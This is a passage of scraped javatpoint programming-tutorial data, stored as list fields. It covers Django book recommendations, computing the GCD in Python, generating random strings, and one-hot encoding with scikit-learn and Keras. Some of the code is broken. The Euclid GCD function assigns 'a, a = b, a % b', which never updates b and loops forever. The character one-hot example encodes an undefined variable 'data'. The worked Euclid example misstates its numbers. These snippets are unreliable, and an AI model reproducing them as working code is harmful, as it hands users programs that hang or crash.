'https://www.javatpoint.com/https://www.amazon.in/Django-Beginners-Build-websites-Python-ebook/dp/B079ZZLRRL/ref=sr_1_fkmr1_1?dchild=1&keywords=Django+for+Beginners%3A+Build+Websites+with+Python+and+DjangoTwo+Scoop+of+Django&qid=1606895427&sr=8-1-fkmr1', 'https://www.javatpoint.com/https://www.amazon.in/Practical-Django-Channels-Applications-Capabilities/dp/1484247043/ref=sr_1_1?dchild=1&keywords=practical+django+2+and+channels+2&qid=1606895546&sr=8-1', 'https://www.javatpoint.com/https://www.javatpoint.com/what-is-github', 'https://www.javatpoint.com/https://www.amazon.in/Build-First-Website-Django-Fully-Functioning/dp/0994616864/ref=sr_1_1?dchild=1&&keywords=build+your+first+website+with+python+and+django+1st+edition&&qid=1606894731&&sr=8-1', 'https://www.javatpoint.com/https://www.amazon.in/Learn-Web-Development-Python-hands/dp/1789953294/ref=sr_1_2?crid=11TB57EF82MV9&&dchild=1&&keywords=learn+web+development+with+python&&qid=1606894879&&sprefix=Learn+Web+Development+with+%2Caps%2C344&&sr=8-2', 'https://www.javatpoint.com/gcd-of-two-number-in-python', 'https://www.javatpoint.com/best-books-to-learn-python', 'https://www.javatpoint.com/gcd-of-two-number-in-python']","['https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers1.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers2.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers3.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers4.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers5.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers6.png', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers7.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers8.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers9.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers10.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers11.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-django-for-beginners-and-advance-programmers12.jpg']",[],"['What is Django?', 'Best Django Books for Beginners', 'Django Books for Advance Programmers', 'Conclusion']","['1. Django for APIs: Build web APIs with Python & Django', '2. Django Unleashed', '3. Beginners Django E-Commerce', '4. Lightweight Django 1st Edition', '5. Django Design Pattern and Best Practices', '6. Django 2 by Example', '7. Two Scoops of Django 1.11: Best Practices for the Django Web Framework', '8. Django for Professionals: Production websites with Python & Django', '9. Django for Beginners: Build Websites with Python and Django', '10. Practice Django 2 and Channels 2', '1. Build Your First Websites with Python and Django 1st Edition', '2. Learn Web Development with Python']",[],"['Learning Django may take a slightly longer time, but once we get the concepts properly. We will explore more concepts Django in our application.', 'We have listed below best Python Django books for beginners.', 'Amazon - Django for APIs', 'Amazon - Django Unleashed', 'Flipkart - Beginners Django E-Commerce', 'Amazon - Lightweight Django', 'Amazon - Django Design Pattern', 'Amazon - Django 2 by Example', 'Amazon - Two Scoops of Django', 'Amazon - Django for Professionals', 'Amazon - Django for Beginners', 'Amazon - Practice Django 2 and Channels 2', 'Amazon - Build Your First Websites', 'Amazon - Learn Web Development']",[],"[""Django is an open-source Python framework used to develop rich web applications. It is one of the most popular frameworks for web development. It provides many built-in features so that the developer only needs to focus on the business logic rather than repetitive functionality. Let's see some awesome features of Django. Let's see some awesome features of Django."", 'This book is written by William S. Vincent. The author has explained how to create RESTful API using Django and the Django REST framework from scratch in this book. This book is not explained ""What is Django""; instead, it teaches us how to write code API that can be reused.', 'This book focuses on the best coding practice to build APIs and also explains the Django REST framework and React (JS library). If you have learned much from the official documentation, this book provides much information and covers only the most important concepts. The author has written this book for beginners, but he also written many complicated topics for advanced programmers.', 'This is the best book for beginners as well as experienced Django programmers. This book has a detailed explanation and starts with scratch to build an application in Django. It includes different problem solving the same problem that we can identify which solution is appropriate. The author shifts the topic explanation from basic to complex topics. Some of the advance topics are difficult to follow initially, but we do the practice, we will appreciate the effort the author has put explain them. This book covers many topics such as Generic views, creating custom, security, performance, users and managers, etc., are explained very effectively.', ""This book is written by Jin McGraw. It is not a purely technical book but also describe some practical concept of the framework. The author hasn't explained the in-built libraries in detail. It focuses on how to use these in projects and scenarios. If someone has a basic knowledge of Django then it will help to sharpen the skill. However, we should have a decent understanding of HTML, CSS, XML, SQL other than Python. This book is also included e-commerce website, however author gives small details about the project but not described fully. We have to find out how to do what we are supposed to do. It is best book to understand Django for basic concepts."", 'This book is written by Jula Elman & Mark Lavin. This is another nice interactive book with hands-on approaching book to learn Django. This book starts with the basic concepts and covers a most of topics in-depth. It is suitable for both beginners and advanced developers. The best thing about this book is that topics are broken into smaller components and explain each component, which makes each read and helps the reader understand the low-level details and overall pictures. The author has taken care to explain every single line code that everyone can understand very easily. We can say that the detailing of this book is just amazing.', 'Before diving into the topic, we must have a basic knowledge jQuery, Bootstrap and HTML. If we have the knowledge of these topics, it will add advantage and we can learn fast. This book is enough to understand the basic concepts, but we might need addition resources such as documentation/blogs to understand why something has been done.', 'This book is written by Arun Ravichandran. This book covers a few unique and important concepts that we would not find in many other resources or online resources. Apart from that, this book discusses a good amount of basics about Django starting with why Django came into existence. The author also discusses many problems with various solutions. It also explains how we make development faster. Various patterns help to reduce the coding time and enhance code performance. The author also explains to identify where and when to use pattern by giving examples and solutions. This book also talks about testing and security which makes it a very effective and useful book.', 'This book is written by Antonio Mele. This book is good for both beginners and intermediate level learners. If someone has a basic knowledge of JavaScript, HTML, and Python, this book would be the best choice. It covers basic and advanced concepts in-depth, including integration with other technologies like Celery and Radis. The author explains many coding examples and covers wide range of topics. We may need Django official documentation to learn understand more methods. We can consider this book to read basic about Django. The author assumes that you have no prior knowledge of Django.', 'This book is written by Daniel Roy Greenfeld. This book is best if someone has worked on a Django project and has basic idea of Django. This book is written for the both types of reader beginners and professionals. It includes tips and valuable suggestions for the best practices. This book includes plenty of informative diagrams that keep us hooked on the book. Writing style of this book is able to maintain a friendly tone. Each chapter is independent than the other so we can skip chapters and them as we like. We will also learn to deploy our application to the cloud(PaaS). The author is shared their experience in the form of tips, code, sample, tricks, and techniques.', ""This book is written by William S. Vincent. This is an extension of the Django for beginners' book. We will learn concepts with the practical approach. In the basic version, we will build simple websites. In this book, we will find many useful tips and tricks to build production apps. We will get many other useful tools in each chapter. The author has chosen very wisely. We need to have basic knowledge of the Python language. The author assumes that the reader do not know any others - Bootstrap, PostgreSQL, Docker, etc. This book also includes a complete guide to building a website covering all the concepts that we will need to become a pro in Django."", ""This book is also written by William S. Vincent. This is the easiest way to start learning Django. The author makes sure that readers don't feel boring while reading this book. This book is fast-paced and has easy flow to explain the topics. The transition of concepts from easy to difficult is smooth from chapter to chapter. We don't need to have prior knowledge of Python and Django to learn from this book. The author has explained each topic in detail that encourages us to create basic applications. We wouldn't need to read from other resources after buying this book. This book includes hello app to complex websites tutorial, and it follows an engaging structure and us seeking more."", ""This book is written by Federico Marani. The best part of this book is for all learners. This book includes step and step guild that we can use to develop web applications. The author focuses on the make the boring technical topic interesting and includes large amount of information. This book understands the mindset perfectly. We may have doubts while this book, but it will be cleared as the book's next thing. The author explores various aspects, such as e-commerce, banking, and finance. He also provides the use cases from each of these domains that developer can use guidance in their projects. In this book, we finds the Django channels that helps to solve problems related to event-driven programming using Redis, WebSocket, and Bootstrap. There are errors while doing code, but debugging is the best way to self-learn. We can find the complete working code on Github, so errors are not so big deal. It is good investment of money; we will get the complete information related to Django."", ""We have listed above few excellent Django books for beginners as well as experienced readers. The above books are quite effective to learn Django's core concepts. However, we are defining few advance books for the programmers or have basic knowledge of Django. These books are given below."", ""This book is written by Nigel George. This is the best book for programmers who work on Python and Django. This book is worth to build a solid foundation in Python. We will need many other resources because it doesn't have much detail regarding topics. This is one of the best books for those who want to switch on Python and Django. Each topic is explained very nicely and includes many practical examples. In this book, we find step by step guidance to building a simple website."", 'This book is a comprehensive book to learn Python and Django simultaneously. The author covers simple topic firsts then moves to the complex topics of Django. In this book, we learn how to build a REST APIs and also learn how to build web application using Django. This book follows the practical approach to describe the topics. The author includes a step by step guide to develop a production website. If the reader belongs to a non-programmer background, he can take a short tutorial and start work with Django.', 'This article covers all excellent, effective, and useful books to learn Django with Python. Django has an extensive community across the world that solves many problems. Django also has the great-written documentation, but sometimes hard to follow. Good Books are the good option to enhance the knowledge of Django. We have figured out some excellent books for all types of learners. Some books have a very detailed explanation of topics and few have a full practical approach to describe the topics. You can choose any of books above mention to start learning Django.']",[],[],[],"['|||Great documentation, a vast community across the world.|||It is fast, secure, reliable, and versatile.|||Written in Python.|||Follow the MVT approach which means the Model View Template.|||It automatically handles the site maps, RSS feeds, content administration, user authentication, etc.|||It provides a built-in admin panel.|||Rapid release of its version.|||It eliminates the need to write SQL queries by using Python objects. SQLite database comes with it.|||']"
139,['GCD of two number in python'],"['Greatest Common Divisor (GCD) is a mathematical term to find the greatest common factor that can perfectly divide the two numbers. A GCD is also known as the Highest Common Factor (HCF). For example, the HCF/ GCD of two numbers 54 and 24 is 6. Because 6 is the largest common divisor that completely divides 54 and 24.']","['https://www.javatpoint.com/python-program-to-generate-a-random-string', 'https://www.javatpoint.com/best-books-to-learn-django-for-beginners-and-advance-programmers', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-program-to-generate-a-random-string', 'https://www.javatpoint.com/best-books-to-learn-django-for-beginners-and-advance-programmers', 'https://www.javatpoint.com/python-program-to-generate-a-random-string']","['https://static.javatpoint.com/python/images/gcd-of-two-number-in-python.png', 'https://static.javatpoint.com/python/images/gcd-of-two-number-in-python2.png', 'https://static.javatpoint.com/python/images/gcd-of-two-number-in-python3.png', 'https://static.javatpoint.com/python/images/gcd-of-two-number-in-python4.png', 'https://static.javatpoint.com/python/images/gcd-of-two-number-in-python5.png']",[],"['GCD Using gcd() Function', 'GCD Using recursion', 'GCD Using the Loop', ""GCD Using Euclid's algorithm or Euclidean Algorithm""]","['Pseudo Code of the Algorithm', 'Pseudo Code of the Euclid Algorithm']",[],"['In python, a gcd() is an inbuilt function offered by the math module to find the greatest common divisor of two numbers. ', 'Where a and b are the two integer number passes as an argument to the function gcd().', ""Let's create a program to print the GCD of two number using the inbuilt function of math.gcd() in python."", 'math_fun.py', 'Step 1: Take two inputs, x and y, from the user.', 'Step 2: Pass the input number as an argument to a recursive function.', 'Step 3: If the second number is equal to zero (0), it returns the first number.', 'Step 5: Call or assign the gcd_fun() to a variable.', 'Step 6: Display the GCD of two numbers.', 'Step 7: Exit from the program.', ""Let's understand the program to find the GCD of two number using the recursion."", 'gcdRecur.py', ""Let's create program to find the GCD of two number in python using the loops."", 'gcdFile.py', 'As we can see in the above program, we take two values as input and pass these numbers to the GCD_Loop () function to return a GCD.', 'Step 1: There are two integer numbers, such as a and b.', 'Step 2: if a = 0, then the GCD(a, b) is b.', 'Step 3: if b = 0, the GCD(a, b) is a.', 'Step 4: a mod b find the', 'Step 5: Suppose a = b and b = R', 'Step 6: Repeat steps 4 and 3 until a mod b is equal or greater than 0.', 'Step 7: GCD = b and then print the result.', 'Step 8: Stop the program.', ""Let's find the H.C.F or GCD of two numbers using Euclid's algorithm in python.""]","['In the above example, math.gcd() function generates the GCD of two given numbers. In the gcd() function, a and b pass as an argument that returns the greatest common divisor of two integer numbers, completely dividing the numbers.', 'Step 4: Else it recursively calls the function with the second number as an argument until it gets the remainder, which divides the second number by the first number.']","['Recursion is a memory consuming function defined in python that calls itself via self-referential expression. It means that the function will continuously call and repeat itself until the defined condition is met to return the greatest common divisor of the number.', ""Euclid's algorithm is an efficient method to find the greatest common divisor of two numbers. It is the oldest algorithm that divides the greater number into smaller ones and takes the remainder. Again, it divides the smaller number from the remainder, and this algorithm continuously divides the number until the remainder becomes 0."", 'For example, suppose we want to calculate the H.C.F of two numbers, 60 and 48. Then we divide the 60 by 48; it returns the remainder 12. Now we again divide the number 24 by 12, and then it returns the remainder 0. So, in this way, we get the H.C.F is 12.']","['gcd(a, b)', '# create a program to print the gcd of two number in python using the math.gcd() function.', 'import math', 'print("" GCD of two number 0 and 0 is "", math.gcd(0, 0)) #math.gcd(a, b), a and b are the two integer number', 'print("" GCD of two number 0 and 48 is "", math.gcd(0, 48))', 'a = 60 # assign the number to variable a', 'b = 48 # assign the number to variable b', 'print("" GCD of two number 60 and 48 is "", math.gcd(a, b)) # pass the variable a and b to math.gcd() function.', 'print("" GCD of two number 48 and -12 is "", math.gcd(48, -12)) # pass the integer number', 'print("" GCD of two number -24 and -18 is "", math.gcd(-24, -18))', 'print("" GCD of two number -60 and 48 is "", math.gcd(-60, 48))', '# write a program to understand the GCD of two number in python using the recursion.', 'def gcd_fun (x, y):', 'if (y == 0): # it divide every number', 'return x  # return x', 'else:', 'return gcd_fun (y, x % y)', 'x =int (input (""Enter the first number: "")) # take first no.', 'y =int (input (""Enter the second number: "")) # take second no.', 'num = gcd_fun(x, y) # call the gcd_fun() to find the result', 'print(""GCD of two number is: "")', 'print(num) # call num', 'def GCD_Loop( a, b):', 'if a > b:  # define the if condition', 'temp = b', 'else:', 'temp = a', 'for i in range(1, temp + 1):', 'if (( a % i == 0) and (b % i == 0 )):', 'gcd = i', 'return gcd', 'x = int(input ("" Enter the first number: "") ) # take first no.', 'y =int (input ("" Enter the second number: "")) # take second no.', 'num = GCD_Loop(x, y) # call the gcd_fun() to find the result', 'print(""GCD of two number is: "")', 'print(num) # call num', ""# Create a program to find the GCD of two number in python using the Euclid's Algorithm."", 'def find_hcf(a,b):', 'while(b):', 'a, a = b, a % b', 'return a', 'a = int(input ("" Enter the first number: "") ) # take first no.', 'b = int(input ("" Enter the second number: "")) # take second no.', 'num = find_hcf(a, b) # call the find_hcf() to get the result', 'print(""  The HCF of two number a and b is "")', 'print(num) # call num']",[],[],[]
140,['Python Program to generate a Random String'],"[""A random refers to the collection of data or information that can be available in any order. The random module in python is used to generate random strings. The random string is consisting of numbers, characters and punctuation series that can contain any pattern. The random module contains two methods random.choice() and secrets.choice(), to generate a secure string. Let's understand how to generate a random string using the random.choice() and secrets.choice() method in python.""]","['https://www.javatpoint.com/yield-keyword-in-python', 'https://www.javatpoint.com/gcd-of-two-number-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-random-module', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/yield-keyword-in-python', 'https://www.javatpoint.com/gcd-of-two-number-in-python', 'https://www.javatpoint.com/yield-keyword-in-python']","['https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string.png', 'https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string2.png', 'https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string3.png', 'https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string4.png', 'https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string5.png', 'https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string6.png', 'https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string7.png', 'https://static.javatpoint.com/python/images/python-program-to-generate-a-random-string8.png']",[],"['Using random.choice()', 'Using secrets.choice()']","['Random String of Specified Characters', 'Generate a random alphanumeric string consisting of fixed letters and digits', 'Use the different method of the random module to generate a safe random string.']","[""Note: The random.choice() method is used in the python program to repeat the same characters strings. If we don't want to display repetitive characters, we should use random.sample() function.""]","['The random.choice() function is used in the python string to generate the sequence of characters and digits that can repeat the string in any order.', 'Create a program to generate a random string using the random.choices() function.', 'Random_str.py', 'Following are the method used in the random module to generate the random string.', 'Generate a random string of upper case and lower-case letters', 'Specific.py', 'Generate a random string without repeating the same characters', 'WithoutRepeat.py', ""Let's write a program to generate an alphanumeric string that contains a fixed number of letters and digits."", 'fixedString.py', ""Let's write a program to print a secure random string using the secrets.choice method."", 'Secret_str.py', ""Let's write a program to print secure random strings using different methods of secrets.choice().""]","['For example, suppose we want a randomly generated alphanumeric string that contains five letters and four digits. We need to define these parameters into the function.', 'A secrets.choice() method is used to generate a more secure random string than random.choice(). It is a cryptographically random string generator that ensures no two processes can obtain the same results simultaneously using secrets.choice() method.']","['As we can see in the above output, the random.sample() method returns a string in which all characters are unique and non-repeating. Whereas, the random.choice() method returns a string that may contain repetitive characters. So, we can say that if we want to generate a unique random string, use random.sample() method.']","['import string', 'import random # define the random module', 'S = 10  # number of characters in the string.', '# call random.choices() string module to find the string in Uppercase + numeric data.', ""ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))"", 'print(""The randomly generated string is : "" + str(ran)) # print the random data', '# write a program to generate the random string in upper and lower case letters.', 'import random', 'import string', 'def Upper_Lower_string(length): # define the function and pass the length as argument', '# Print the string in Lowercase', ""result = ''.join((random.choice(string.ascii_lowercase) for x in range(length))) # run loop until the define length"", 'print("" Random string generated in Lowercase: "", result)', '# Print the string in Uppercase', ""result1 = ''.join((random.choice(string.ascii_uppercase) for x in range(length))) # run the loop until the define length"", 'print("" Random string generated in Uppercase: "", result1)', 'Upper_Lower_string(10) # define the length', '# create a program to generate the random string of given letters.', 'import random', 'import string', 'def specific_string(length):', ""sample_string = 'pqrstuvwxy' # define the specific string"", '# define the condition for random string', ""result = ''.join((random.choice(sample_string)) for x in range(length))"", 'print("" Randomly generated string is: "", result)', 'specific_string(8) # define the length', 'specific_string(10)', '# create a program to generate a string with or without repeating the characters.', 'import random', 'import string', 'print(""Use of random.choice() method"")', 'def specific_string(length):', 'letters = string.ascii_lowercase # define the lower case string', '# define the condition for random.choice() method', ""result = ''.join((random.choice(letters)) for x in range(length))"", 'print("" Random generated string with repetition: "", result)', 'specific_string(8) # define the length', 'specific_string(10)', 'print("""") # print the space', 'print(""Use of random.sample() method"")', 'def WithoutRepeat(length):', 'letters = string.ascii_lowercase # define the specific string', '# define the condition for random.sample() method', ""result1 = ''.join((random.sample(letters, length)))"", 'print("" Random generated string without repetition: "", result1)', 'WithoutRepeat(8) # define the length', 'WithoutRepeat(10)', 'import random', 'import string', 'def random_string(letter_count, digit_count):', ""str1 = ''.join((random.choice(string.ascii_letters) for x in range(letter_count)))"", ""str1 += ''.join((random.choice(string.digits) for x in range(digit_count)))"", 'sam_list = list(str1) # it converts the string to list.', 'random.shuffle(sam_list) # It uses a random.shuffle() function to shuffle the string.', ""final_string = ''.join(sam_list)"", 'return final_string', '# define the length of the letter is eight and digits is four', 'print(""Generated random string of first string is:"", random_string(8, 4))', '# define the length of the letter is seven and digits is five', 'print(""Generated random string of second string is:"", random_string(7, 5))', 'import random', 'import string', 'import secrets # import package', 'num = 10 # define the length of the string', '# define the secrets.choice() method and pass the string.ascii_letters + string.digits as an parameters.', ""res = ''.join(secrets.choice(string.ascii_letters + string.digits) for x in range(num))"", '# print the Secure string', 'print(""Secure random string is :""+ str(res))', '# write a program to display the different random string method using the secrets.choice().', '# imports necessary packages', 'import random', 'import string', 'import secrets', 'num = 10 # define the length of the string', '# define the secrets.choice() method and pass the string.ascii_letters + string.digits as an parameters.', ""res = ''.join(secrets.choice(string.ascii_letters + string.digits) for x in range(num))"", '# Print the Secure string with the combination of ascii letters and digits', 'print(""Secure random string is :""+ str(res))', ""res = ''.join(secrets.choice(string.ascii_letters) for x in range(num))"", '# Print the Secure string with the combination of ascii letters', 'print(""Secure random string is :""+ str(res))', ""res = ''.join(secrets.choice(string.ascii_uppercase) for x in range(num))"", '# Print the Secure string in Uppercase', 'print(""Secure random string is :""+ str(res))', ""res = ''.join(secrets.choice(string.ascii_lowercase) for x in range(num))"", '# Print the Secure string in Lowercase', 'print(""Secure random string is :""+ str(res))', ""res = ''.join(secrets.choice(string.ascii_letters + string.punctuation) for x in range(num))"", '# Print the Secure string with the combination of letters and punctuation', 'print(""Secure random string is :""+ str(res))', ""res = ''.join(secrets.choice(string.digits) for x in range(num))"", '# Print the Secure string using string.digits', 'print(""Secure random string is :""+ str(res))', ""res = ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for x in range(num))"", '# Print the Secure string with the combonation of letters, digits and punctuation', 'print(""Secure random string is :""+ str(res))']",[],['Methods|||Description&&&String.ascii_letters|||It returns a random string that contains both uppercase and lowercase characters.&&&String_ascii_uppercase|||It is a random string method that only returns a string in uppercase characters.&&&String.ascii_lowercase|||It is a random string method that returns a string only in lowercase characters.&&&String.digits|||It is a random string method that returns a string with numeric characters.&&&String.punctuation|||It is a random string method that returns a string with punctuation characters.'],[]
141,['How to One Hot Encode Sequence Data in Python'],"['In this tutorial, we will learn to convert our input or output sequence data to a one-hot encoding for use in sequence classification.']","['https://www.javatpoint.com/how-to-write-square-root-in-python', 'https://www.javatpoint.com/yield-keyword-in-python', 'https://www.javatpoint.com/how-to-write-square-root-in-python', 'https://www.javatpoint.com/yield-keyword-in-python', 'https://www.javatpoint.com/how-to-write-square-root-in-python']",['https://static.javatpoint.com/python/images/how-to-one-hot-encode-sequence-data-in-python.png'],[],"['What is Categorical Data?', 'Problem with Categorical Data', 'How to Convert Categorical Data to Numeric Data', 'What is One Hot Encoding?', 'Why use a One Hot Encoding?', 'Manual One Hot Encoding', 'One Hot Encode using Scikit-learn', 'One Hot Encoding with Keras']",['Example of a One Hot Encoding'],[],"['First, we will discuss the Categorical Data.', 'There are two methods that use to convert categorical data into numerical data.', 'In the next section, we will discuss One-Hot Encoding.', ""Let's understand it by using the following simple example."", 'Input Table -', 'The output will be shown below after one hot encoding.', 'If we represent the above output in a vector form then it will look like as below.', 'Cat - > [1, 0, 0, 0]', 'Dog - > [0, 1, 0, 0]', 'Cow - > [0, 0, 1, 0]', 'Camel - > [0, 0, 0, 1]', 'In the following example, we will consider an example string of alphabet letters that will be converted into integer value.', ""Now, we will implement one hot coding to the above given string value. Let's see the following example."", 'Explanation:', 'Now, we will learn to implement one hot coding using the scikit-learn library.', ""In this example, let's assume the following output sequence of the 3 labels."", 'An example sequence of 10 time step may be.', ""Let's understand the following example."", 'Explanation - ', 'In this example, we have five integer values [0, 1, 2, 3, 4] and we have an input sequence of the following 15 numbers.', ""Let's understand the following example."", 'Explanation -']","['One Hot Encoding is a useful feature of machine learning because few Machine learning algorithms cannot work with categorical data directly. While working with the datasets, we come across the column that holds no specific order of preference.', 'If we are working with a sequence classification type problem, the categorical data must be converted to numbers. This technique is also used when we work with deep learning methods such as Long Short-term Memory recurrent neural networks.', ""Categorical Data are the types of variables that have the label value rather than numerical values. These types of variables are also called nominal. Let's see the following example of categorical data."", 'As we can see in the above code, some categories may have a natural relationship such as natural ordering. In the third example, the ""place"" variable has a natural ordering of values.', 'Some machine learning algorithms have the ability to work with categorical data directly. A few algorithms cannot operate on the label data directly because they require all the data variables and output variables to be numeric.', ""Let's see another example - Suppose there is a category called animal and it has fours values - Cat, Dog, Cow and Camel. Consider the following table which consists of animals and their corresponding categorical values."", 'But there may be problems if no ordinal relationship find. If we allow the representation to lean or any such relationship, it might be damaged the learning to solve problems.', 'As we can see in the above output, first letter h is encoded as 7. Then, this integer coding is converted to the one hot encoding. One integer encodes character at a time.', 'Each character has the specific index value; we marked that index of a specific character as 1. The first character is represented as a 7 in the binary vector of 27. We marked the 7th index as 1 for h.', 'We encode with the integer value to the above labels, such as 1, 2, 3. In the one hot encoding, we will use the binary vector with 3 values, such as [1, 0, 0]. The sequence includes the at least one example of one possible value in the sequence.', 'We will use the scikit-learn library. We will use the LabelEncoder module from it for creating an integer encoding of labels and OneHotEncoder for creating a one hot encoding of integer encode value.', ""Let's suppose we have a sequence that is already integer encoded. We can work with the integer encoding directly or map the integer encoding on the label values. We can use the to_categorical() function to one hot encodes integer data."", 'In the above code, we have encoded the integer encoded as the binary vectors and printed. Then, we used the Numpy argmax() function to invert the encoding on the first value in the sequence.']","['Therefore, we have to convert hierarchical data into numerical form. Suppose the categorical variable is an output variable. In that case, you may also want to change forecasts by the model back into a categorical form to represent them or use them in some application.', 'A one hot encoding is used to convert the categorical variables into numeric values. Before doing further data analysis, the categorical values are mapped to integer values. Each column contains ""0"" or ""1"" corresponding to which column it has been placed. In this process, each integer value is represented as a binary vector that is all zero expect the index of the integer, which is marked with a 1.', ""Suppose we have a sequence of labels with the value 'yellow' and 'red.' To convert them into the numerical value, we assign 'yellow' an integer value 1 to corresponding to its number of categories present in column and 'red' as 0. When we encounter these labels, we will assign same integer value. It is called an integer encoding."", 'One of the best advantages of One Hot encoding is that it represents categorical data to be more expressive. As we discussed earlier, many machine learning algorithms cannot be able to work with the categorical data directly, so that it needs to be converted into integer.', 'We can use the integer value directly or where it is needed. It can solve the problem where the natural ordinal has a relationship between the categories. For example - We can assign the integer values to ""weather"" label, such as \'winter\', \'summer\' and \'Monsoon\'.', 'In the above code, we have declared the input string and printed it. Next, we defined the universe of the possible input value. Then, a mapping of all possible inputs is created from the char values to integer values. We used this mapping to encode the input string.', 'In the above code, first, we have printed the sequence of labels. Then, we performed integer encoding and finally the one hot encoding. The OneHotEncoder class returns well-organized sparse encoding. But this is not efficient for the some application such as use with keras library.']","['hello world', 'from numpy import argmax', '# Here we are define input string', ""str_data = 'hello python'"", 'print(str_data)', '# Here we are defining possible input values of english alphabate', ""eng_alphabet = 'abcdefghijklmnopqrstuvwxyz '"", '# define a mapping of chars to integers', 'char_to_int = dict((c, i) for i, c in enumerate(eng_alphabet))', 'int_to_char = dict((i, c) for i, c in enumerate(eng_alphabet))', '# input data is encoding in integer', 'int_encoded = [char_to_int[char] for char in data]', 'print(int_encoded)', '# one hot encode', 'onehot_encoded = list()', 'for value in int_encoded:', 'letter = [0 for _ in range(len(eng_alphabet))]', 'letter[value] = 1', 'onehot_encoded.append(letter)', 'print(onehot_encoded)', '# invert encoding', 'inverted = int_to_char[argmax(onehot_encoded[0])]', 'print(inverted)', '""apple""', '""mango""', '""banana""', 'apple, apple, mango, apple, banana, banana, mango, apple.', 'from numpy import array', 'from numpy import argmax', 'from sklearn.preprocessing import LabelEncoder', 'from sklearn.preprocessing import OneHotEncoder', '# defining sequence example', ""data_1 = ['apple', 'apple', 'mango', 'apple', 'banana', 'banana', 'mango', 'apple']"", 'values_of_seq = array(data_1)', 'print(values_of_seq)', '# first appling integer encode', 'label_encoder = LabelEncoder()', 'integer_encoded = label_encoder.fit_transform(values_of_seq)', 'print(integer_encoded)', '# Now doing binary encode', 'onehot_encoder = OneHotEncoder(sparse=False)', 'integer_encoded = integer_encoded.reshape(len(integer_encoded), 1)', 'onehot_encoded = onehot_encoder.fit_transform(integer_encoded)', 'print(onehot_encoded)', 'data_1 = [1, 4, 3, 3, 0, 3, 2, 2, 4, 0, 1, 2, 1, 4, 3]', 'from numpy import array', 'from numpy import argmax', 'from keras.utils import to_categorical', '# define example', 'data_1 = [1, 4, 3, 3, 0, 3, 2, 2, 4, 0, 1, 2, 1, 4, 3]', 'data = array(data_1)', 'print(data)', '# one hot encoding using the to_categorical() method', 'encoded = to_categorical(data)', 'print(encoded)', '# invert encoding', 'inverted = argmax(encoded[0])', 'print(inverted)']","['hello python', '[7, 4, 11, 11, 14, 26, 15, 24, 19, 7, 14, 13]', '[[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],', '[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]', ""['apple' 'apple' 'mango' 'apple' 'banana' 'banana' 'mango' 'apple']"", '[0 0 2 0 1 1 2 0]', '[[1. 0. 0.]', '[1. 0. 0.]', '[0. 0. 1.]', '[1. 0. 0.]', '[0. 1. 0.]', '[0. 1. 0.]', '[0. 0. 1.]', '[1. 0. 0.]]', '[1 4 3 3 0 3 2 2 4 0 1 2 1 4 3]', '[[0. 1. 0. 0. 0.]', '[0. 0. 0. 0. 1.]', '[0. 0. 0. 